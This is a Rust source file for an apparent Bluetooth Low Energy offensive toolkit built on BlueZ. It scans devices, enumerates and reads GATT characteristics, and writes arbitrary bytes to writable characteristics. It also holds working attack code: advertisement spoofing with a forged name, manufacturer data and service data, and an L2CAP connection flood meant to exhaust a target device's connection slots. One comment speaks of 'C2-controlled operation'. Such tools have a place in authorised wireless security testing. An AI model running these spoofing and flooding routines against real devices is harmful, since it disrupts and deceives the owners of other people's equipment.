// Copyright 2025-2026 CEMAXECUTER LLC

pub mod relay;

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use bluer::{Address, Session};
use tokio::runtime::Runtime;
use tokio::time::timeout;

/// Timeout for a single GATT query (connect + discover + read + disconnect).
const GATT_TIMEOUT: Duration = Duration::from_secs(15);

/// Timeout for connecting to a device.
const CONNECT_TIMEOUT: Duration = Duration::from_secs(10);

/// A single GATT characteristic.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GattCharacteristic {
    pub uuid: String,
    pub flags: Vec<String>,
    /// Value read from the characteristic (if readable), hex-encoded.
    pub value: Option<String>,
    /// UTF-8 interpretation of value (if valid UTF-8 and printable).
    pub value_str: Option<String>,
}

/// A single GATT service.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GattService {
    pub uuid: String,
    pub primary: bool,
    pub characteristics: Vec<GattCharacteristic>,
}

/// Result of a GATT query.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GattResult {
    pub mac: String,
    pub device_name: Option<String>,
    pub services: Vec<GattService>,
    pub error: Option<String>,
    pub timestamp: f64,
}

/// Result of a GATT write operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GattWriteResult {
    pub mac: String,
    pub service_uuid: String,
    pub char_uuid: String,
    pub success: bool,
    pub error: Option<String>,
    pub timestamp: f64,
}

/// Check if a BLE PDU type indicates a connectable device.
/// ADV_IND (0) and ADV_DIRECT_IND (1) are connectable.
pub fn is_connectable(pdu_type: u8) -> bool {
    pdu_type == 0 || pdu_type == 1
}

/// HCI GATT prober. Owns a single-threaded tokio runtime for async BlueZ operations.
pub struct HciProber {
    rt: Runtime,
}

impl HciProber {
    /// Create a new HciProber with its own tokio runtime.
    pub fn new() -> Result<Self, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| format!("failed to create tokio runtime: {}", e))?;
        Ok(Self { rt })
    }

    /// Check if an HCI adapter is available via BlueZ D-Bus.
    pub fn is_available(&self) -> bool {
        self.rt.block_on(async {
            let session = match Session::new().await {
                Ok(s) => s,
                Err(_) => return false,
            };
            let adapter = match session.default_adapter().await {
                Ok(a) => a,
                Err(_) => return false,
            };
            adapter.is_powered().await.unwrap_or(false)
        })
    }

    /// Query GATT services and characteristics for the given MAC address.
    /// This is a blocking call that runs async discovery on the internal runtime.
    pub fn query(&self, mac: &str) -> GattResult {
        let mac_owned = mac.to_string();
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs_f64();

        self.rt.block_on(async {
            match timeout(GATT_TIMEOUT, discover_gatt(&mac_owned)).await {
                Ok(Ok(mut result)) => {
                    result.timestamp = now;
                    result
                }
                Ok(Err(e)) => GattResult {
                    mac: mac_owned,
                    device_name: None,
                    services: Vec::new(),
                    error: Some(e),
                    timestamp: now,
                },
                Err(_) => GattResult {
                    mac: mac_owned,
                    device_name: None,
                    services: Vec::new(),
                    error: Some("GATT query timed out".to_string()),
                    timestamp: now,
                },
            }
        })
    }
    /// Write a value to a specific GATT characteristic.
    /// `data` is the raw bytes to write (hex-decoded by caller).
    /// If `service_uuid` is None, searches all services for the characteristic.
    pub fn write_characteristic(
        &self,
        mac: &str,
        service_uuid: Option<&str>,
        char_uuid: &str,
        data: &[u8],
    ) -> GattWriteResult {
        let mac_owned = mac.to_string();
        let char_uuid_owned = char_uuid.to_string();
        let svc_uuid_owned = service_uuid.map(|s| s.to_string());
        let data_owned = data.to_vec();
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs_f64();

        self.rt.block_on(async {
            match timeout(
                GATT_TIMEOUT,
                write_gatt_char(&mac_owned, svc_uuid_owned.as_deref(), &char_uuid_owned, &data_owned),
            )
            .await
            {
                Ok(Ok(svc)) => GattWriteResult {
                    mac: mac_owned,
                    service_uuid: svc,
                    char_uuid: char_uuid_owned,
                    success: true,
                    error: None,
                    timestamp: now,
                },
                Ok(Err(e)) => GattWriteResult {
                    mac: mac_owned,
                    service_uuid: svc_uuid_owned.unwrap_or_default(),
                    char_uuid: char_uuid_owned,
                    success: false,
                    error: Some(e),
                    timestamp: now,
                },
                Err(_) => GattWriteResult {
                    mac: mac_owned,
                    service_uuid: svc_uuid_owned.unwrap_or_default(),
                    char_uuid: char_uuid_owned,
                    success: false,
                    error: Some("GATT write timed out".to_string()),
                    timestamp: now,
                },
            }
        })
    }
}

// ---------------------------------------------------------------------------
// Advertisement spoofing
// ---------------------------------------------------------------------------

/// Configuration for a spoofed BLE advertisement.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpoofAdvConfig {
    /// Local name to advertise
    pub name: Option<String>,
    /// Manufacturer data: company_id -> raw bytes
    pub manufacturer_data: HashMap<u16, Vec<u8>>,
    /// Service UUIDs to advertise
    pub service_uuids: Vec<String>,
    /// Service data: UUID -> raw bytes
    pub service_data: HashMap<String, Vec<u8>>,
    /// TX power level to include
    pub tx_power: Option<i16>,
    /// Whether to advertise as connectable (peripheral) vs broadcast
    pub connectable: bool,
    /// Duration in seconds (0 = until stopped)
    pub duration_secs: u32,
}

/// Result of a spoof operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpoofAdvResult {
    pub success: bool,
    pub error: Option<String>,
    pub duration_secs: u32,
    pub timestamp: f64,
}

/// Spoof a BLE advertisement using the system HCI adapter.
/// Blocks for the specified duration, then stops advertising.
pub fn spoof_advertisement(config: &SpoofAdvConfig) -> SpoofAdvResult {
    let rt = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            return SpoofAdvResult {
                success: false,
                error: Some(format!("runtime error: {}", e)),
                duration_secs: 0,
                timestamp: now_ts(),
            };
        }
    };

    rt.block_on(async {
        match run_spoof_adv(config).await {
            Ok(duration) => SpoofAdvResult {
                success: true,
                error: None,
                duration_secs: duration,
                timestamp: now_ts(),
            },
            Err(e) => SpoofAdvResult {
                success: false,
                error: Some(e),
                duration_secs: 0,
                timestamp: now_ts(),
            },
        }
    })
}

async fn run_spoof_adv(config: &SpoofAdvConfig) -> Result<u32, String> {
    use bluer::adv;
    use std::collections::BTreeMap;
    use std::collections::BTreeSet;

    let session = Session::new()
        .await
        .map_err(|e| format!("BlueZ session error: {}", e))?;
    let adapter = session
        .default_adapter()
        .await
        .map_err(|e| format!("no HCI adapter: {}", e))?;

    if !adapter.is_powered().await.unwrap_or(false) {
        return Err("HCI adapter not powered".into());
    }

    // Build the advertisement
    let mut adv = adv::Advertisement {
        advertisement_type: if config.connectable {
            adv::Type::Peripheral
        } else {
            adv::Type::Broadcast
        },
        local_name: config.name.clone(),
        ..Default::default()
    };

    // Service UUIDs
    for uuid_str in &config.service_uuids {
        if let Ok(uuid) = uuid_str.parse::<bluer::Uuid>() {
            adv.service_uuids.insert(uuid);
        }
    }

    // Manufacturer data
    for (&company_id, data) in &config.manufacturer_data {
        adv.manufacturer_data.insert(company_id, data.clone());
    }

    // Service data
    for (uuid_str, data) in &config.service_data {
        if let Ok(uuid) = uuid_str.parse::<bluer::Uuid>() {
            adv.service_data.insert(uuid, data.clone());
        }
    }

    // TX power
    if let Some(tx) = config.tx_power {
        adv.tx_power = Some(tx);
    }

    // Register the advertisement (starts broadcasting)
    let handle = adapter
        .advertise(adv)
        .await
        .map_err(|e| format!("failed to start advertising: {}", e))?;

    eprintln!("HCI spoof: advertising started (connectable={})", config.connectable);

    let duration = config.duration_secs;
    if duration > 0 {
        tokio::time::sleep(Duration::from_secs(duration as u64)).await;
    } else {
        // Run until adapter is powered off or process exits
        // For C2-controlled operation, this would be cancelled externally
        tokio::time::sleep(Duration::from_secs(3600)).await;
    }

    // Dropping the handle stops advertising
    drop(handle);
    eprintln!("HCI spoof: advertising stopped");

    Ok(duration)
}

fn now_ts() -> f64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs_f64()
}

// ---------------------------------------------------------------------------
// L2CAP connection flood
// ---------------------------------------------------------------------------

/// Configuration for L2CAP connection flood.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct L2capFloodConfig {
    pub mac: String,
    /// Number of simultaneous connections to attempt
    pub count: u32,
    /// Duration in seconds to hold connections open
    pub hold_secs: u32,
    /// L2CAP PSM (Protocol Service Multiplexer) to target. 0 = ATT (default).
    pub psm: u16,
}

/// Result of L2CAP flood operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct L2capFloodResult {
    pub connections_opened: u32,
    pub connections_failed: u32,
    pub success: bool,
    pub error: Option<String>,
    pub timestamp: f64,
}

/// Open multiple L2CAP connections to a target device to exhaust its
/// connection slots. Blocks for `hold_secs` then disconnects all.
pub fn l2cap_flood(config: &L2capFloodConfig) -> L2capFloodResult {
    let rt = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            return L2capFloodResult {
                connections_opened: 0,
                connections_failed: 0,
                success: false,
                error: Some(format!("runtime error: {}", e)),
                timestamp: now_ts(),
            };
        }
    };

    rt.block_on(async {
        match run_l2cap_flood(config).await {
            Ok(result) => result,
            Err(e) => L2capFloodResult {
                connections_opened: 0,
                connections_failed: 0,
                success: false,
                error: Some(e),
                timestamp: now_ts(),
            },
        }
    })
}

async fn run_l2cap_flood(config: &L2capFloodConfig) -> Result<L2capFloodResult, String> {
    let addr: Address = config
        .mac
        .parse()
        .map_err(|e| format!("invalid MAC '{}': {}", config.mac, e))?;

    let psm = if config.psm == 0 { 4 } else { config.psm }; // 4 = ATT

    let sa = bluer::l2cap::SocketAddr {
        addr,
        addr_type: bluer::AddressType::LePublic,
        psm,
        cid: 0,
    };

    let mut opened = 0u32;
    let mut failed = 0u32;
    let mut sockets = Vec::new();

    eprintln!("L2CAP flood: opening {} connections to {} (PSM {})",
        config.count, config.mac, psm);

    for i in 0..config.count {
        match bluer::l2cap::Socket::new_stream() {
            Ok(sock) => {
                match tokio::time::timeout(
                    Duration::from_secs(5),
                    sock.connect(sa),
                )
                .await
                {
                    Ok(Ok(stream)) => {
                        opened += 1;
                        sockets.push(stream);
                        if opened % 5 == 0 || i == config.count - 1 {
                            eprintln!("L2CAP flood: {}/{} connections open", opened, i + 1);
                        }
                    }
                    Ok(Err(e)) => {
                        failed += 1;
                        if failed <= 3 {
                            eprintln!("L2CAP flood: connect #{} failed: {}", i + 1, e);
                        }
                    }
                    Err(_) => {
                        failed += 1;
                        if failed <= 3 {
                            eprintln!("L2CAP flood: connect #{} timed out", i + 1);
                        }
                    }
                }
            }
            Err(e) => {
                failed += 1;
                if failed <= 3 {
                    eprintln!("L2CAP flood: socket creation failed: {}", e);
                }
            }
        }
        // Small delay between connection attempts
        tokio::time::sleep(Duration::from_millis(50)).await;
    }

    eprintln!(
        "L2CAP flood: {} open, {} failed. Holding for {}s...",
        opened, failed, config.hold_secs
    );

    if config.hold_secs > 0 {
        tokio::time::sleep(Duration::from_secs(config.hold_secs as u64)).await;
    }

    // Drop all connections
    let held = sockets.len();
    drop(sockets);
    eprintln!("L2CAP flood: released {} connections", held);

    Ok(L2capFloodResult {
        connections_opened: opened,
        connections_failed: failed,
        success: opened > 0,
        error: None,
        timestamp: now_ts(),
    })
}

// ---------------------------------------------------------------------------
// Active scanner (--active-scan)
// ---------------------------------------------------------------------------

/// Result of a single BLE active-scan observation from the HCI adapter.
/// Contains advertisement + scan-response data merged by BlueZ.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub mac: String,
    pub name: Option<String>,
    /// Company ID -> raw bytes from manufacturer-specific data AD type.
    pub manufacturer_data: Option<HashMap<u16, Vec<u8>>>,
    pub service_uuids: Vec<String>,
    /// Service UUID string -> raw bytes from service data AD types.
    pub service_data: Option<HashMap<String, Vec<u8>>>,
    pub appearance: Option<u16>,
    pub tx_power: Option<i16>,
    pub rssi: Option<i16>,
    pub timestamp: f64,
}

/// Minimum interval between reports for the same MAC address (seconds).
const SCAN_RATE_LIMIT_SECS: u64 = 10;

/// HCI active scanner. Uses BlueZ discovery to perform LE active scanning,
/// collecting advertisement + scan-response data for nearby devices.
/// Runs independently of the GATT prober (HciProber).
pub struct HciScanner {
    rt: Runtime,
}

impl HciScanner {
    /// Create a new HciScanner with its own single-threaded tokio runtime.
    pub fn new() -> Result<Self, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| format!("failed to create tokio runtime: {}", e))?;
        Ok(Self { rt })
    }

    /// Run the active scanner, sending results to `tx` until `running` becomes false.
    /// This is a blocking call -- run it on a dedicated thread.
    pub fn run(
        &self,
        tx: crossbeam::channel::Sender<ScanResult>,
        running: Arc<AtomicBool>,
    ) {
        self.rt.block_on(async {
            if let Err(e) = scan_loop(&tx, &running).await {
                eprintln!("HCI scan: {}", e);
            }
        });
    }
}

/// Core async scanning loop.
async fn scan_loop(
    tx: &crossbeam::channel::Sender<ScanResult>,
    running: &Arc<AtomicBool>,
) -> Result<(), String> {
    let session = Session::new()
        .await
        .map_err(|e| format!("BlueZ session error: {}", e))?;
    let adapter = session
        .default_adapter()
        .await
        .map_err(|e| format!("no HCI adapter: {}", e))?;

    if !adapter.is_powered().await.unwrap_or(false) {
        return Err("HCI adapter not powered".into());
    }

    // Start discovery (active scanning is the BlueZ default)
    let disco = adapter
        .discover_devices()
        .await
        .map_err(|e| format!("discovery error: {}", e))?;

    eprintln!("HCI scan: active scanning started");

    use futures::StreamExt;
    let mut stream = Box::pin(disco);

    // Rate-limit: track last report time per MAC
    let mut last_report: HashMap<Address, std::time::Instant> = HashMap::new();
    let rate_limit = Duration::from_secs(SCAN_RATE_LIMIT_SECS);

    while running.load(Ordering::Relaxed) {
        // Poll with 1-second timeout so we can check the stop flag
        match timeout(Duration::from_secs(1), stream.next()).await {
            Ok(Some(event)) => {
                let addr = match &event {
                    bluer::AdapterEvent::DeviceAdded(a) => *a,
                    bluer::AdapterEvent::PropertyChanged(_) => continue,
                    _ => continue,
                };

                // Rate-limit per MAC
                let now_inst = std::time::Instant::now();
                if let Some(last) = last_report.get(&addr) {
                    if now_inst.duration_since(*last) < rate_limit {
                        continue;
                    }
                }

                // Read device properties
                let device = match adapter.device(addr) {
                    Ok(d) => d,
                    Err(_) => continue,
                };

                let name = device.name().await.ok().flatten();
                let rssi = device.rssi().await.ok().flatten();

                // Skip devices with no RSSI (stale cache entries)
                if rssi.is_none() {
                    continue;
                }

                let manufacturer_data = device.manufacturer_data().await.ok().flatten().map(|m| {
                    m.into_iter()
                        .map(|(k, v)| (k, v))
                        .collect::<HashMap<u16, Vec<u8>>>()
                });

                let service_uuids: Vec<String> = device
                    .uuids()
                    .await
                    .ok()
                    .flatten()
                    .map(|set| set.into_iter().map(|u| u.to_string()).collect())
                    .unwrap_or_default();

                let service_data = device.service_data().await.ok().flatten().map(|m| {
                    m.into_iter()
                        .map(|(k, v)| (k.to_string(), v))
                        .collect::<HashMap<String, Vec<u8>>>()
                });

                let appearance = device.appearance().await.ok().flatten();
                let tx_power = device.tx_power().await.ok().flatten();

                let now_ts = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_secs_f64();

                let result = ScanResult {
                    mac: format!("{}", addr),
                    name,
                    manufacturer_data,
                    service_uuids,
                    service_data,
                    appearance,
                    tx_power,
                    rssi,
                    timestamp: now_ts,
                };

                last_report.insert(addr, now_inst);

                if tx.send(result).is_err() {
                    break; // receiver dropped
                }
            }
            Ok(None) => break, // stream ended
            Err(_) => continue, // timeout, check stop flag
        }
    }

    eprintln!("HCI scan: stopped");
    Ok(())
}

/// Convert CharacteristicFlags to a list of human-readable strings.
fn flags_to_strings(f: &bluer::gatt::CharacteristicFlags) -> Vec<String> {
    let mut v = Vec::new();
    if f.broadcast { v.push("broadcast".into()); }
    if f.read { v.push("read".into()); }
    if f.write_without_response { v.push("write-without-response".into()); }
    if f.write { v.push("write".into()); }
    if f.notify { v.push("notify".into()); }
    if f.indicate { v.push("indicate".into()); }
    if f.authenticated_signed_writes { v.push("authenticated-signed-writes".into()); }
    v
}

/// Core async GATT discovery logic.
async fn discover_gatt(mac: &str) -> Result<GattResult, String> {
    let addr: Address = mac.parse().map_err(|e| format!("invalid MAC '{}': {}", mac, e))?;

    let session = Session::new()
        .await
        .map_err(|e| format!("BlueZ session error: {}", e))?;
    let adapter = session
        .default_adapter()
        .await
        .map_err(|e| format!("no HCI adapter: {}", e))?;

    // Start discovery to ensure BlueZ knows about the device.
    // discover_devices() returns impl Stream; dropping it stops scanning.
    let disco = adapter
        .discover_devices()
        .await
        .map_err(|e| format!("discovery error: {}", e))?;

    // Wait up to 3 seconds for the target device to appear in BlueZ
    use futures::StreamExt;
    let device = {
        let mut found = adapter.device(addr).ok();
        if found.is_none() {
            let mut stream = Box::pin(disco);
            let deadline = tokio::time::Instant::now() + Duration::from_secs(3);
            loop {
                let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
                if remaining.is_zero() {
                    break;
                }
                match timeout(remaining, stream.next()).await {
                    Ok(Some(bluer::AdapterEvent::DeviceAdded(a))) if a == addr => {
                        found = adapter.device(addr).ok();
                        break;
                    }
                    Ok(Some(_)) => continue,
                    _ => break,
                }
            }
        }
        found.ok_or_else(|| format!("device {} not found", mac))?
    };

    // Connect if not already connected
    let was_connected = device.is_connected().await.unwrap_or(false);
    if !was_connected {
        timeout(CONNECT_TIMEOUT, device.connect())
            .await
            .map_err(|_| format!("connect to {} timed out", mac))?
            .map_err(|e| format!("connect to {} failed: {}", mac, e))?;
    }

    // Wait for service resolution (BlueZ auto-discovers GATT after connect)
    let mut resolved = device.is_services_resolved().await.unwrap_or(false);
    if !resolved {
        for _ in 0..50 {
            tokio::time::sleep(Duration::from_millis(100)).await;
            resolved = device.is_services_resolved().await.unwrap_or(false);
            if resolved {
                break;
            }
        }
    }

    let device_name = device.name().await.ok().flatten();

    // Enumerate services and characteristics
    let mut services = Vec::new();
    if resolved {
        if let Ok(svc_list) = device.services().await {
            for svc in svc_list {
                let svc_uuid = match svc.uuid().await {
                    Ok(u) => u.to_string(),
                    Err(_) => continue,
                };
                let primary = svc.primary().await.unwrap_or(true);

                let mut characteristics = Vec::new();
                if let Ok(char_list) = svc.characteristics().await {
                    for ch in char_list {
                        let ch_uuid = match ch.uuid().await {
                            Ok(u) => u.to_string(),
                            Err(_) => continue,
                        };
                        let ch_flags = ch.flags().await.unwrap_or_default();
                        let can_read = ch_flags.read;
                        let flags = flags_to_strings(&ch_flags);

                        let (value, value_str) = if can_read {
                            match timeout(Duration::from_secs(2), ch.read()).await {
                                Ok(Ok(v)) => {
                                    let hex = v.iter()
                                        .map(|b| format!("{:02x}", b))
                                        .collect::<String>();
                                    let utf8 = if v.iter().all(|&b| (0x20..0x7f).contains(&b) || b == 0x0a) {
                                        String::from_utf8(v).ok()
                                    } else {
                                        None
                                    };
                                    (Some(hex), utf8)
                                }
                                _ => (None, None),
                            }
                        } else {
                            (None, None)
                        };

                        characteristics.push(GattCharacteristic {
                            uuid: ch_uuid,
                            flags,
                            value,
                            value_str,
                        });
                    }
                }

                services.push(GattService {
                    uuid: svc_uuid,
                    primary,
                    characteristics,
                });
            }
        }
    }

    // Disconnect if we initiated the connection
    if !was_connected {
        let _ = device.disconnect().await;
    }

    Ok(GattResult {
        mac: mac.to_string(),
        device_name,
        services,
        error: None,
        timestamp: 0.0,
    })
}

/// Write a value to a specific GATT characteristic.
/// Returns the service UUID that contained the characteristic.
async fn write_gatt_char(
    mac: &str,
    service_uuid: Option<&str>,
    char_uuid: &str,
    data: &[u8],
) -> Result<String, String> {
    let addr: Address = mac
        .parse()
        .map_err(|e| format!("invalid MAC '{}': {}", mac, e))?;

    let session = Session::new()
        .await
        .map_err(|e| format!("BlueZ session error: {}", e))?;
    let adapter = session
        .default_adapter()
        .await
        .map_err(|e| format!("no HCI adapter: {}", e))?;

    // Start discovery to ensure BlueZ knows about the device
    let _disco = adapter
        .discover_devices()
        .await
        .map_err(|e| format!("discovery error: {}", e))?;

    // Wait briefly for the device to appear
    tokio::time::sleep(Duration::from_secs(1)).await;

    let device = adapter
        .device(addr)
        .map_err(|e| format!("device {} not found: {}", mac, e))?;

    let was_connected = device.is_connected().await.unwrap_or(false);
    if !was_connected {
        timeout(CONNECT_TIMEOUT, device.connect())
            .await
            .map_err(|_| format!("connect to {} timed out", mac))?
            .map_err(|e| format!("connect to {} failed: {}", mac, e))?;
    }

    // Wait for service resolution
    for _ in 0..50 {
        if device.is_services_resolved().await.unwrap_or(false) {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }

    let target_char_uuid: bluer::Uuid = char_uuid
        .parse()
        .map_err(|e| format!("invalid characteristic UUID '{}': {}", char_uuid, e))?;

    let target_svc_uuid: Option<bluer::Uuid> = if let Some(s) = service_uuid {
        Some(s.parse().map_err(|e| format!("invalid service UUID '{}': {}", s, e))?)
    } else {
        None
    };

    // Search services for the target characteristic
    let svc_list = device
        .services()
        .await
        .map_err(|e| format!("failed to enumerate services: {}", e))?;

    for svc in &svc_list {
        let svc_uuid_val = match svc.uuid().await {
            Ok(u) => u,
            Err(_) => continue,
        };

        // Filter by service UUID if specified
        if let Some(ref target) = target_svc_uuid {
            if svc_uuid_val != *target {
                continue;
            }
        }

        if let Ok(chars) = svc.characteristics().await {
            for ch in &chars {
                let ch_uuid_val = match ch.uuid().await {
                    Ok(u) => u,
                    Err(_) => continue,
                };
                if ch_uuid_val != target_char_uuid {
                    continue;
                }

                // Found the characteristic -- attempt write
                let flags = ch.flags().await.unwrap_or_default();
                if flags.write || flags.write_without_response {
                    ch.write(data)
                        .await
                        .map_err(|e| format!("write failed: {}", e))?;
                } else {
                    if !was_connected {
                        let _ = device.disconnect().await;
                    }
                    return Err(format!(
                        "characteristic {} does not support write (flags: {:?})",
                        char_uuid,
                        flags_to_strings(&flags)
                    ));
                }

                if !was_connected {
                    let _ = device.disconnect().await;
                }
                return Ok(svc_uuid_val.to_string());
            }
        }
    }

    if !was_connected {
        let _ = device.disconnect().await;
    }
    Err(format!(
        "characteristic {} not found on device {}",
        char_uuid, mac
    ))
}
